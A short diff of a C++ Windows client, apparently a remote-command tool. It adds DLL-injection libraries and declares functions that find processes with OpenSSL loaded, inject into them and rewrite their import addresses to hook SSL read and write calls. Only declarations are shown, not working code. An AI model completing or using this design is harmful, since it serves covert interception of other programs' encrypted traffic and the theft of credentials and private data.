@@ -2,6 +2,7 @@
 #include <cstdio>
 #include <vector>
 #include <queue>
+#include <set>
 #include <string>
 #include <sstream>
 #include <thread>
@@ -11,11 +12,18 @@
 #include <stdexcept>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-
+#include <psapi.h>
 #include <fcntl.h>
 #include <io.h>
 
 #include <zlib.h>
+
+//=========Dll iject libs==========
+#include <TlHelp32.h>
+#include <Psapi.h>
+#include <Dbghelp.h>
+#pragma comment(lib, "Dbghelp.lib")
+//=================================
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma warning(disable:4996)
@@ -46,6 +54,14 @@ private:
 	void RunRequestsCycle();
 
 	std::string ParsCommand();
+
+	// DLL injection
+	int DllInjection();
+	int ChangeImportFuncAddr();
+	void static MySslRead();
+	void static MySslWrite();
+	bool isOpensslModuleLoaded(DWORD processId);
+	std::vector<std::pair<HANDLE, DWORD>> FindOpensslProcesses();
 
 
 	PTP_POOL pool_;
